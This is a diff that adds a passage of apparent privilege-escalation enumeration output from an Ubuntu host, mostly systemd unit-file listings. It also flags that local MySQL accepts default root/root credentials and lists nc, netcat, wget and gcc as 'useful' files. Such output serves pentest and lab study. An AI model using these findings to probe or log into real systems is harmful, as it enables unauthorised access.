@@ -842,3 +842,848 @@ lrwxrwxrwx 1 root root    9 Jan 15  2020 stop-bootlogd.service -> /dev/null
 lrwxrwxrwx 1 root root    9 Jan 15  2020 stop-bootlogd-single.service -> /dev/null
 drwxr-xr-x 2 root root 4.0K Jan 15  2020 rescue.target.wants
 drwxr-xr-x 2 root root 4.0K Jan 15  2020 resolvconf.service.wants
+lrwxrwxrwx 1 root root    9 Jan 15  2020 rmnologin.service -> /dev/null
+lrwxrwxrwx 1 root root   15 Jan 15  2020 runlevel0.target -> poweroff.target
+lrwxrwxrwx 1 root root   13 Jan 15  2020 runlevel1.target -> rescue.target
+lrwxrwxrwx 1 root root   17 Jan 15  2020 runlevel2.target -> multi-user.target
+lrwxrwxrwx 1 root root   17 Jan 15  2020 runlevel3.target -> multi-user.target
+drwxr-xr-x 2 root root 4.0K Jan 15  2020 getty.target.wants
+drwxr-xr-x 2 root root 4.0K Jan 15  2020 graphical.target.wants
+lrwxrwxrwx 1 root root    9 Jan 15  2020 halt.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jan 15  2020 hostname.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jan 15  2020 hwclock.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jan 15  2020 killprocs.service -> /dev/null
+lrwxrwxrwx 1 root root   28 Jan 15  2020 kmod.service -> systemd-modules-load.service
+drwxr-xr-x 2 root root 4.0K Jan 15  2020 local-fs.target.wants
+lrwxrwxrwx 1 root root   28 Jan 15  2020 module-init-tools.service -> systemd-modules-load.service
+lrwxrwxrwx 1 root root    9 Jan 15  2020 motd.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jan 15  2020 mountall-bootclean.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jan 15  2020 mountall.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jan 15  2020 mountdevsubfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jan 15  2020 mountkernfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jan 15  2020 mountnfs-bootclean.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jan 15  2020 mountnfs.service -> /dev/null
+lrwxrwxrwx 1 root root   22 Jan 15  2020 procps.service -> systemd-sysctl.service
+lrwxrwxrwx 1 root root   16 Jan 15  2020 rc.local.service -> rc-local.service
+drwxr-xr-x 2 root root 4.0K Jan 15  2020 rc-local.service.d
+lrwxrwxrwx 1 root root    9 Jan 15  2020 rc.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jan 15  2020 rcS.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jan 15  2020 reboot.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jan 15  2020 cryptdisks-early.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jan 15  2020 cryptdisks.service -> /dev/null
+lrwxrwxrwx 1 root root   13 Jan 15  2020 ctrl-alt-del.target -> reboot.target
+lrwxrwxrwx 1 root root   25 Jan 15  2020 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
+lrwxrwxrwx 1 root root   23 Jan 15  2020 dbus-org.freedesktop.locale1.service -> systemd-localed.service
+lrwxrwxrwx 1 root root   22 Jan 15  2020 dbus-org.freedesktop.login1.service -> systemd-logind.service
+lrwxrwxrwx 1 root root   24 Jan 15  2020 dbus-org.freedesktop.network1.service -> systemd-networkd.service
+lrwxrwxrwx 1 root root   24 Jan 15  2020 dbus-org.freedesktop.resolve1.service -> systemd-resolved.service
+lrwxrwxrwx 1 root root   25 Jan 15  2020 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
+lrwxrwxrwx 1 root root   16 Jan 15  2020 default.target -> graphical.target
+lrwxrwxrwx 1 root root    9 Jan 15  2020 fuse.service -> /dev/null
+lrwxrwxrwx 1 root root   14 Jan 15  2020 autovt@.service -> getty@.service
+lrwxrwxrwx 1 root root    9 Jan 15  2020 bootlogd.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jan 15  2020 bootlogs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jan 15  2020 bootmisc.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jan 15  2020 checkfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jan 15  2020 checkroot-bootclean.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jan 15  2020 checkroot.service -> /dev/null
+drwxr-xr-x 2 root root 4.0K Feb 26  2019 busnames.target.wants
+-rw-r--r-- 1 root root  879 Feb 13  2019 basic.target
+-rw-r--r-- 1 root root  379 Feb 13  2019 bluetooth.target
+-rw-r--r-- 1 root root  358 Feb 13  2019 busnames.target
+-rw-r--r-- 1 root root  770 Feb 13  2019 console-getty.service
+-rw-r--r-- 1 root root  742 Feb 13  2019 console-shell.service
+-rw-r--r-- 1 root root  791 Feb 13  2019 container-getty@.service
+-rw-r--r-- 1 root root  394 Feb 13  2019 cryptsetup-pre.target
+-rw-r--r-- 1 root root  366 Feb 13  2019 cryptsetup.target
+-rw-r--r-- 1 root root 1010 Feb 13  2019 debug-shell.service
+-rw-r--r-- 1 root root  670 Feb 13  2019 dev-hugepages.mount
+-rw-r--r-- 1 root root  624 Feb 13  2019 dev-mqueue.mount
+-rw-r--r-- 1 root root 1009 Feb 13  2019 emergency.service
+-rw-r--r-- 1 root root  431 Feb 13  2019 emergency.target
+-rw-r--r-- 1 root root  501 Feb 13  2019 exit.target
+-rw-r--r-- 1 root root  440 Feb 13  2019 final.target
+-rw-r--r-- 1 root root 1.5K Feb 13  2019 getty@.service
+-rw-r--r-- 1 root root  460 Feb 13  2019 getty.target
+-rw-r--r-- 1 root root  558 Feb 13  2019 graphical.target
+-rw-r--r-- 1 root root  487 Feb 13  2019 halt.target
+-rw-r--r-- 1 root root  447 Feb 13  2019 hibernate.target
+-rw-r--r-- 1 root root  468 Feb 13  2019 hybrid-sleep.target
+-rw-r--r-- 1 root root  630 Feb 13  2019 initrd-cleanup.service
+-rw-r--r-- 1 root root  553 Feb 13  2019 initrd-fs.target
+-rw-r--r-- 1 root root  790 Feb 13  2019 initrd-parse-etc.service
+-rw-r--r-- 1 root root  526 Feb 13  2019 initrd-root-fs.target
+-rw-r--r-- 1 root root  640 Feb 13  2019 initrd-switch-root.service
+-rw-r--r-- 1 root root  691 Feb 13  2019 initrd-switch-root.target
+-rw-r--r-- 1 root root  671 Feb 13  2019 initrd.target
+-rw-r--r-- 1 root root  664 Feb 13  2019 initrd-udevadm-cleanup-db.service
+-rw-r--r-- 1 root root  501 Feb 13  2019 kexec.target
+-rw-r--r-- 1 root root  677 Feb 13  2019 kmod-static-nodes.service
+-rw-r--r-- 1 root root  395 Feb 13  2019 local-fs-pre.target
+-rw-r--r-- 1 root root  507 Feb 13  2019 local-fs.target
+-rw-r--r-- 1 root root  405 Feb 13  2019 machine.slice
+-rw-r--r-- 1 root root  473 Feb 13  2019 mail-transport-agent.target
+-rw-r--r-- 1 root root  492 Feb 13  2019 multi-user.target
+-rw-r--r-- 1 root root  464 Feb 13  2019 network-online.target
+-rw-r--r-- 1 root root  461 Feb 13  2019 network-pre.target
+-rw-r--r-- 1 root root  480 Feb 13  2019 network.target
+-rw-r--r-- 1 root root  514 Feb 13  2019 nss-lookup.target
+-rw-r--r-- 1 root root  473 Feb 13  2019 nss-user-lookup.target
+-rw-r--r-- 1 root root  354 Feb 13  2019 paths.target
+-rw-r--r-- 1 root root  552 Feb 13  2019 poweroff.target
+-rw-r--r-- 1 root root  377 Feb 13  2019 printer.target
+-rw-r--r-- 1 root root  693 Feb 13  2019 proc-sys-fs-binfmt_misc.automount
+-rw-r--r-- 1 root root  603 Feb 13  2019 proc-sys-fs-binfmt_misc.mount
+-rw-r--r-- 1 root root  568 Feb 13  2019 quotaon.service
+-rw-r--r-- 1 root root  612 Feb 13  2019 rc-local.service
+-rw-r--r-- 1 root root  543 Feb 13  2019 reboot.target
+-rw-r--r-- 1 root root  396 Feb 13  2019 remote-fs-pre.target
+-rw-r--r-- 1 root root  482 Feb 13  2019 remote-fs.target
+-rw-r--r-- 1 root root  978 Feb 13  2019 rescue.service
+-rw-r--r-- 1 root root  486 Feb 13  2019 rescue.target
+-rw-r--r-- 1 root root  500 Feb 13  2019 rpcbind.target
+-rw-r--r-- 1 root root 1.1K Feb 13  2019 serial-getty@.service
+-rw-r--r-- 1 root root  402 Feb 13  2019 shutdown.target
+-rw-r--r-- 1 root root  362 Feb 13  2019 sigpwr.target
+-rw-r--r-- 1 root root  420 Feb 13  2019 sleep.target
+-rw-r--r-- 1 root root  403 Feb 13  2019 -.slice
+-rw-r--r-- 1 root root  409 Feb 13  2019 slices.target
+-rw-r--r-- 1 root root  380 Feb 13  2019 smartcard.target
+-rw-r--r-- 1 root root  356 Feb 13  2019 sockets.target
+-rw-r--r-- 1 root root  380 Feb 13  2019 sound.target
+-rw-r--r-- 1 root root  441 Feb 13  2019 suspend.target
+-rw-r--r-- 1 root root  353 Feb 13  2019 swap.target
+-rw-r--r-- 1 root root  715 Feb 13  2019 sys-fs-fuse-connections.mount
+-rw-r--r-- 1 root root  518 Feb 13  2019 sysinit.target
+-rw-r--r-- 1 root root  719 Feb 13  2019 sys-kernel-config.mount
+-rw-r--r-- 1 root root  662 Feb 13  2019 sys-kernel-debug.mount
+-rw-r--r-- 1 root root 1.3K Feb 13  2019 syslog.socket
+-rw-r--r-- 1 root root  646 Feb 13  2019 systemd-ask-password-console.path
+-rw-r--r-- 1 root root  653 Feb 13  2019 systemd-ask-password-console.service
+-rw-r--r-- 1 root root  574 Feb 13  2019 systemd-ask-password-wall.path
+-rw-r--r-- 1 root root  681 Feb 13  2019 systemd-ask-password-wall.service
+-rw-r--r-- 1 root root  724 Feb 13  2019 systemd-backlight@.service
+-rw-r--r-- 1 root root  959 Feb 13  2019 systemd-binfmt.service
+-rw-r--r-- 1 root root  650 Feb 13  2019 systemd-bootchart.service
+-rw-r--r-- 1 root root 1.0K Feb 13  2019 systemd-bus-proxyd.service
+-rw-r--r-- 1 root root  409 Feb 13  2019 systemd-bus-proxyd.socket
+-rw-r--r-- 1 root root  497 Feb 13  2019 systemd-exit.service
+-rw-r--r-- 1 root root  551 Feb 13  2019 systemd-fsckd.service
+-rw-r--r-- 1 root root  540 Feb 13  2019 systemd-fsckd.socket
+-rw-r--r-- 1 root root  674 Feb 13  2019 systemd-fsck-root.service
+-rw-r--r-- 1 root root  648 Feb 13  2019 systemd-fsck@.service
+-rw-r--r-- 1 root root  544 Feb 13  2019 systemd-halt.service
+-rw-r--r-- 1 root root  631 Feb 13  2019 systemd-hibernate-resume@.service
+-rw-r--r-- 1 root root  501 Feb 13  2019 systemd-hibernate.service
+-rw-r--r-- 1 root root  710 Feb 13  2019 systemd-hostnamed.service
+-rw-r--r-- 1 root root  778 Feb 13  2019 systemd-hwdb-update.service
+-rw-r--r-- 1 root root  519 Feb 13  2019 systemd-hybrid-sleep.service
+-rw-r--r-- 1 root root  480 Feb 13  2019 systemd-initctl.service
+-rw-r--r-- 1 root root  524 Feb 13  2019 systemd-initctl.socket
+-rw-r--r-- 1 root root  607 Feb 13  2019 systemd-journald-audit.socket
+-rw-r--r-- 1 root root 1.1K Feb 13  2019 systemd-journald-dev-log.socket
+-rw-r--r-- 1 root root 1.3K Feb 13  2019 systemd-journald.service
+-rw-r--r-- 1 root root  842 Feb 13  2019 systemd-journald.socket
+-rw-r--r-- 1 root root  731 Feb 13  2019 systemd-journal-flush.service
+-rw-r--r-- 1 root root  557 Feb 13  2019 systemd-kexec.service
+-rw-r--r-- 1 root root  691 Feb 13  2019 systemd-localed.service
+-rw-r--r-- 1 root root 1.2K Feb 13  2019 systemd-logind.service
+-rw-r--r-- 1 root root  693 Feb 13  2019 systemd-machine-id-commit.service
+-rw-r--r-- 1 root root  967 Feb 13  2019 systemd-modules-load.service
+-rw-r--r-- 1 root root 1.3K Feb 13  2019 systemd-networkd.service
+-rw-r--r-- 1 root root  591 Feb 13  2019 systemd-networkd.socket
+-rw-r--r-- 1 root root  685 Feb 13  2019 systemd-networkd-wait-online.service
+-rw-r--r-- 1 root root  553 Feb 13  2019 systemd-poweroff.service
+-rw-r--r-- 1 root root  614 Feb 13  2019 systemd-quotacheck.service
+-rw-r--r-- 1 root root  717 Feb 13  2019 systemd-random-seed.service
+-rw-r--r-- 1 root root  548 Feb 13  2019 systemd-reboot.service
+-rw-r--r-- 1 root root  757 Feb 13  2019 systemd-remount-fs.service
+-rw-r--r-- 1 root root  907 Feb 13  2019 systemd-resolved.service
+-rw-r--r-- 1 root root  696 Feb 13  2019 systemd-rfkill.service
+-rw-r--r-- 1 root root  617 Feb 13  2019 systemd-rfkill.socket
+-rw-r--r-- 1 root root  497 Feb 13  2019 systemd-suspend.service
+-rw-r--r-- 1 root root  653 Feb 13  2019 systemd-sysctl.service
+-rw-r--r-- 1 root root  655 Feb 13  2019 systemd-timedated.service
+-rw-r--r-- 1 root root 1.1K Feb 13  2019 systemd-timesyncd.service
+-rw-r--r-- 1 root root  598 Feb 13  2019 systemd-tmpfiles-clean.service
+-rw-r--r-- 1 root root  450 Feb 13  2019 systemd-tmpfiles-clean.timer
+-rw-r--r-- 1 root root  703 Feb 13  2019 systemd-tmpfiles-setup-dev.service
+-rw-r--r-- 1 root root  683 Feb 13  2019 systemd-tmpfiles-setup.service
+-rw-r--r-- 1 root root  578 Feb 13  2019 systemd-udevd-control.socket
+-rw-r--r-- 1 root root  570 Feb 13  2019 systemd-udevd-kernel.socket
+-rw-r--r-- 1 root root  825 Feb 13  2019 systemd-udevd.service
+-rw-r--r-- 1 root root  823 Feb 13  2019 systemd-udev-settle.service
+-rw-r--r-- 1 root root  743 Feb 13  2019 systemd-udev-trigger.service
+-rw-r--r-- 1 root root  757 Feb 13  2019 systemd-update-utmp-runlevel.service
+-rw-r--r-- 1 root root  754 Feb 13  2019 systemd-update-utmp.service
+-rw-r--r-- 1 root root  573 Feb 13  2019 systemd-user-sessions.service
+-rw-r--r-- 1 root root  436 Feb 13  2019 system.slice
+-rw-r--r-- 1 root root  585 Feb 13  2019 system-update.target
+-rw-r--r-- 1 root root  405 Feb 13  2019 timers.target
+-rw-r--r-- 1 root root  395 Feb 13  2019 time-sync.target
+-rw-r--r-- 1 root root  417 Feb 13  2019 umount.target
+-rw-r--r-- 1 root root  528 Feb 13  2019 user@.service
+-rw-r--r-- 1 root root  392 Feb 13  2019 user.slice
+-rw-r--r-- 1 root root  342 Nov 15  2018 getty-static.service
+-rw-r--r-- 1 root root  153 Nov 15  2018 sigpwr-container-shutdown.service
+-rw-r--r-- 1 root root  175 Nov 15  2018 systemd-networkd-resolvconf-update.path
+-rw-r--r-- 1 root root  715 Nov 15  2018 systemd-networkd-resolvconf-update.service
+-rw-r--r-- 1 root root  225 Oct  9  2018 apt-daily.service
+-rw-r--r-- 1 root root  156 Oct  9  2018 apt-daily.timer
+-rw-r--r-- 1 root root  238 Oct  9  2018 apt-daily-upgrade.service
+-rw-r--r-- 1 root root  184 Oct  9  2018 apt-daily-upgrade.timer
+-rw-r--r-- 1 root root  618 Oct  2  2018 friendly-recovery.service
+-rw-r--r-- 1 root root  172 Oct  2  2018 friendly-recovery.target
+-rw-r--r-- 1 root root  445 Aug 21  2018 ssh.service
+-rw-r--r-- 1 root root  196 Aug 21  2018 ssh@.service
+-rw-r--r-- 1 root root  216 Aug 21  2018 ssh.socket
+-rw-r--r-- 1 root root  189 May 16  2018 uuidd.service
+-rw-r--r-- 1 root root  126 May 16  2018 uuidd.socket
+lrwxrwxrwx 1 root root   27 May  9  2018 plymouth-log.service -> plymouth-read-write.service
+lrwxrwxrwx 1 root root   21 May  9  2018 plymouth.service -> plymouth-quit.service
+-rw-r--r-- 1 root root  412 May  9  2018 plymouth-halt.service
+-rw-r--r-- 1 root root  426 May  9  2018 plymouth-kexec.service
+-rw-r--r-- 1 root root  421 May  9  2018 plymouth-poweroff.service
+-rw-r--r-- 1 root root  194 May  9  2018 plymouth-quit.service
+-rw-r--r-- 1 root root  200 May  9  2018 plymouth-quit-wait.service
+-rw-r--r-- 1 root root  244 May  9  2018 plymouth-read-write.service
+-rw-r--r-- 1 root root  416 May  9  2018 plymouth-reboot.service
+-rw-r--r-- 1 root root  532 May  9  2018 plymouth-start.service
+-rw-r--r-- 1 root root  291 May  9  2018 plymouth-switch-root.service
+-rw-r--r-- 1 root root  490 May  9  2018 systemd-ask-password-plymouth.path
+-rw-r--r-- 1 root root  467 May  9  2018 systemd-ask-password-plymouth.service
+-rw-r--r-- 1 root root  479 May  8  2018 run-vmblock-fuse.mount
+-rw-r--r-- 1 root root  328 Apr 19  2018 open-vm-tools.service
+-rw-r--r-- 1 root root  298 Mar 22  2018 vgauth.service
+-rw-r--r-- 1 root root  420 Nov 29  2017 resolvconf.service
+-rw-r--r-- 1 root root  411 Feb  3  2017 mysql.service
+-rw-r--r-- 1 root root  269 Jan 31  2017 setvtrgb.service
+-rw-r--r-- 1 root root  491 Jan 12  2017 dbus.service
+-rw-r--r-- 1 root root  106 Jan 12  2017 dbus.socket
+-rw-r--r-- 1 root root  735 Nov 30  2016 networking.service
+-rw-r--r-- 1 root root  497 Nov 30  2016 ifup@.service
+-rw-r--r-- 1 root root  631 Nov  3  2016 accounts-daemon.service
+-rw-r--r-- 1 root root  285 Jun 16  2016 keyboard-setup.service
+-rw-r--r-- 1 root root  288 Jun 16  2016 console-setup.service
+drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel1.target.wants
+drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel2.target.wants
+drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel3.target.wants
+drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel4.target.wants
+drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel5.target.wants
+-rw-r--r-- 1 root root  251 Apr  5  2016 cron.service
+-rw-r--r-- 1 root root  290 Apr  5  2016 rsyslog.service
+-rw-r--r-- 1 root root  241 Mar  2  2015 ufw.service
+-rw-r--r-- 1 root root  250 Feb 24  2015 ureadahead-stop.service
+-rw-r--r-- 1 root root  242 Feb 24  2015 ureadahead-stop.timer
+-rw-r--r-- 1 root root  401 Feb 24  2015 ureadahead.service
+-rw-r--r-- 1 root root  188 Feb 24  2014 rsync.service
+
+/lib/systemd/system/apache2.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 42 Jun 11  2018 apache2-systemd.conf
+
+/lib/systemd/system/halt.target.wants:
+total 0
+lrwxrwxrwx 1 root root 24 May  9  2018 plymouth-halt.service -> ../plymouth-halt.service
+
+/lib/systemd/system/initrd-switch-root.target.wants:
+total 0
+lrwxrwxrwx 1 root root 25 May  9  2018 plymouth-start.service -> ../plymouth-start.service
+lrwxrwxrwx 1 root root 31 May  9  2018 plymouth-switch-root.service -> ../plymouth-switch-root.service
+
+/lib/systemd/system/kexec.target.wants:
+total 0
+lrwxrwxrwx 1 root root 25 May  9  2018 plymouth-kexec.service -> ../plymouth-kexec.service
+
+/lib/systemd/system/multi-user.target.wants:
+total 0
+lrwxrwxrwx 1 root root 15 Jan 15  2020 getty.target -> ../getty.target
+lrwxrwxrwx 1 root root 33 Jan 15  2020 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
+lrwxrwxrwx 1 root root 25 Jan 15  2020 systemd-logind.service -> ../systemd-logind.service
+lrwxrwxrwx 1 root root 39 Jan 15  2020 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+lrwxrwxrwx 1 root root 32 Jan 15  2020 systemd-user-sessions.service -> ../systemd-user-sessions.service
+lrwxrwxrwx 1 root root 24 May  9  2018 plymouth-quit.service -> ../plymouth-quit.service
+lrwxrwxrwx 1 root root 29 May  9  2018 plymouth-quit-wait.service -> ../plymouth-quit-wait.service
+lrwxrwxrwx 1 root root 15 Jan 12  2017 dbus.service -> ../dbus.service
+
+/lib/systemd/system/poweroff.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Jan 15  2020 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+lrwxrwxrwx 1 root root 28 May  9  2018 plymouth-poweroff.service -> ../plymouth-poweroff.service
+
+/lib/systemd/system/reboot.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Jan 15  2020 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+lrwxrwxrwx 1 root root 26 May  9  2018 plymouth-reboot.service -> ../plymouth-reboot.service
+
+/lib/systemd/system/sysinit.target.wants:
+total 0
+lrwxrwxrwx 1 root root 24 Jan 15  2020 console-setup.service -> ../console-setup.service
+lrwxrwxrwx 1 root root 20 Jan 15  2020 cryptsetup.target -> ../cryptsetup.target
+lrwxrwxrwx 1 root root 22 Jan 15  2020 dev-hugepages.mount -> ../dev-hugepages.mount
+lrwxrwxrwx 1 root root 19 Jan 15  2020 dev-mqueue.mount -> ../dev-mqueue.mount
+lrwxrwxrwx 1 root root 25 Jan 15  2020 keyboard-setup.service -> ../keyboard-setup.service
+lrwxrwxrwx 1 root root 28 Jan 15  2020 kmod-static-nodes.service -> ../kmod-static-nodes.service
+lrwxrwxrwx 1 root root 36 Jan 15  2020 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
+lrwxrwxrwx 1 root root 19 Jan 15  2020 setvtrgb.service -> ../setvtrgb.service
+lrwxrwxrwx 1 root root 32 Jan 15  2020 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
+lrwxrwxrwx 1 root root 26 Jan 15  2020 sys-kernel-config.mount -> ../sys-kernel-config.mount
+lrwxrwxrwx 1 root root 25 Jan 15  2020 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
+lrwxrwxrwx 1 root root 36 Jan 15  2020 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
+lrwxrwxrwx 1 root root 25 Jan 15  2020 systemd-binfmt.service -> ../systemd-binfmt.service
+lrwxrwxrwx 1 root root 30 Jan 15  2020 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
+lrwxrwxrwx 1 root root 27 Jan 15  2020 systemd-journald.service -> ../systemd-journald.service
+lrwxrwxrwx 1 root root 32 Jan 15  2020 systemd-journal-flush.service -> ../systemd-journal-flush.service
+lrwxrwxrwx 1 root root 36 Jan 15  2020 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
+lrwxrwxrwx 1 root root 31 Jan 15  2020 systemd-modules-load.service -> ../systemd-modules-load.service
+lrwxrwxrwx 1 root root 30 Jan 15  2020 systemd-random-seed.service -> ../systemd-random-seed.service
+lrwxrwxrwx 1 root root 25 Jan 15  2020 systemd-sysctl.service -> ../systemd-sysctl.service
+lrwxrwxrwx 1 root root 37 Jan 15  2020 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
+lrwxrwxrwx 1 root root 33 Jan 15  2020 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
+lrwxrwxrwx 1 root root 24 Jan 15  2020 systemd-udevd.service -> ../systemd-udevd.service
+lrwxrwxrwx 1 root root 31 Jan 15  2020 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
+lrwxrwxrwx 1 root root 30 Jan 15  2020 systemd-update-utmp.service -> ../systemd-update-utmp.service
+lrwxrwxrwx 1 root root 30 May  9  2018 plymouth-read-write.service -> ../plymouth-read-write.service
+lrwxrwxrwx 1 root root 25 May  9  2018 plymouth-start.service -> ../plymouth-start.service
+
+/lib/systemd/system/sockets.target.wants:
+total 0
+lrwxrwxrwx 1 root root 25 Jan 15  2020 systemd-initctl.socket -> ../systemd-initctl.socket
+lrwxrwxrwx 1 root root 32 Jan 15  2020 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
+lrwxrwxrwx 1 root root 34 Jan 15  2020 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
+lrwxrwxrwx 1 root root 26 Jan 15  2020 systemd-journald.socket -> ../systemd-journald.socket
+lrwxrwxrwx 1 root root 31 Jan 15  2020 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
+lrwxrwxrwx 1 root root 30 Jan 15  2020 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
+lrwxrwxrwx 1 root root 14 Jan 12  2017 dbus.socket -> ../dbus.socket
+
+/lib/systemd/system/systemd-resolved.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 200 Nov 15  2018 resolvconf.conf
+
+/lib/systemd/system/systemd-timesyncd.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 251 Nov 15  2018 disable-with-time-daemon.conf
+
+/lib/systemd/system/timers.target.wants:
+total 0
+lrwxrwxrwx 1 root root 31 Jan 15  2020 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer
+
+/lib/systemd/system/sigpwr.target.wants:
+total 0
+lrwxrwxrwx 1 root root 36 Jan 15  2020 sigpwr-container-shutdown.service -> ../sigpwr-container-shutdown.service
+
+/lib/systemd/system/rescue.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Jan 15  2020 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/resolvconf.service.wants:
+total 0
+lrwxrwxrwx 1 root root 42 Jan 15  2020 systemd-networkd-resolvconf-update.path -> ../systemd-networkd-resolvconf-update.path
+
+/lib/systemd/system/getty.target.wants:
+total 0
+lrwxrwxrwx 1 root root 23 Jan 15  2020 getty-static.service -> ../getty-static.service
+
+/lib/systemd/system/graphical.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Jan 15  2020 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/local-fs.target.wants:
+total 0
+lrwxrwxrwx 1 root root 29 Jan 15  2020 systemd-remount-fs.service -> ../systemd-remount-fs.service
+
+/lib/systemd/system/rc-local.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 290 Nov 15  2018 debian.conf
+
+/lib/systemd/system/busnames.target.wants:
+total 0
+
+/lib/systemd/system/runlevel1.target.wants:
+total 0
+
+/lib/systemd/system/runlevel2.target.wants:
+total 0
+
+/lib/systemd/system/runlevel3.target.wants:
+total 0
+
+/lib/systemd/system/runlevel4.target.wants:
+total 0
+
+/lib/systemd/system/runlevel5.target.wants:
+total 0
+
+/lib/systemd/system-sleep:
+total 4.0K
+-rwxr-xr-x 1 root root 92 Mar 17  2016 hdparm
+
+/lib/systemd/system-generators:
+total 692K
+-rwxr-xr-x 1 root root  71K Feb 13  2019 systemd-cryptsetup-generator
+-rwxr-xr-x 1 root root  63K Feb 13  2019 systemd-dbus1-generator
+-rwxr-xr-x 1 root root  43K Feb 13  2019 systemd-debug-generator
+-rwxr-xr-x 1 root root  83K Feb 13  2019 systemd-fstab-generator
+-rwxr-xr-x 1 root root  43K Feb 13  2019 systemd-getty-generator
+-rwxr-xr-x 1 root root 123K Feb 13  2019 systemd-gpt-auto-generator
+-rwxr-xr-x 1 root root  39K Feb 13  2019 systemd-hibernate-resume-generator
+-rwxr-xr-x 1 root root  43K Feb 13  2019 systemd-insserv-generator
+-rwxr-xr-x 1 root root  35K Feb 13  2019 systemd-rc-local-generator
+-rwxr-xr-x 1 root root  31K Feb 13  2019 systemd-system-update-generator
+-rwxr-xr-x 1 root root 103K Feb 13  2019 systemd-sysv-generator
+-rwxr-xr-x 1 root root  287 Oct  2  2018 friendly-recovery
+
+/lib/systemd/system-preset:
+total 4.0K
+-rw-r--r-- 1 root root 869 Feb 13  2019 90-systemd.preset
+
+/lib/systemd/network:
+total 12K
+-rw-r--r-- 1 root root 404 Feb 13  2019 80-container-host0.network
+-rw-r--r-- 1 root root 482 Feb 13  2019 80-container-ve.network
+-rw-r--r-- 1 root root  80 Feb 13  2019 99-default.link
+
+/lib/systemd/system-shutdown:
+total 0
+
+### SOFTWARE #############################################
+[-] Sudo version:
+Sudo version 1.8.16
+
+[-] MYSQL version:
+mysql  Ver 14.14 Distrib 5.7.28, for Linux (x86_64) using  EditLine wrapper
+
+[+] We can connect to the local MYSQL service with default root/root credentials!
+mysqladmin  Ver 8.42 Distrib 5.7.28, for Linux on x86_64
+Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Server version          5.7.28-0ubuntu0.16.04.2
+Protocol version        10
+Connection              Localhost via UNIX socket
+UNIX socket             /var/run/mysqld/mysqld.sock
+Uptime:                 1 hour 59 min 23 sec
+
+Threads: 1  Questions: 932  Slow queries: 0  Opens: 128  Flush tables: 1  Open tables: 45  Queries per second avg: 0.130
+
+[-] Apache version:
+Server version: Apache/2.4.18 (Ubuntu)
+Server built:   2019-10-08T13:31:25
+
+[-] Apache user configuration:
+APACHE_RUN_USER=www-data
+APACHE_RUN_GROUP=www-data
+
+[-] Installed Apache modules:
+Loaded Modules:
+ core_module (static)
+ so_module (static)
+ watchdog_module (static)
+ http_module (static)
+ log_config_module (static)
+ logio_module (static)
+ version_module (static)
+ unixd_module (static)
+ access_compat_module (shared)
+ alias_module (shared)
+ auth_basic_module (shared)
+ authn_core_module (shared)
+ authn_file_module (shared)
+ authz_core_module (shared)
+ authz_host_module (shared)
+ authz_user_module (shared)
+ autoindex_module (shared)
+ deflate_module (shared)
+ dir_module (shared)
+ env_module (shared)
+ filter_module (shared)
+ mime_module (shared)
+ mpm_prefork_module (shared)
+ negotiation_module (shared)
+ php7_module (shared)
+ setenvif_module (shared)
+ status_module (shared)
+
+### INTERESTING FILES ####################################
+[-] Useful file locations:
+/bin/nc
+/bin/netcat
+/usr/bin/wget
+/usr/bin/gcc
+
+[-] Installed compilers:
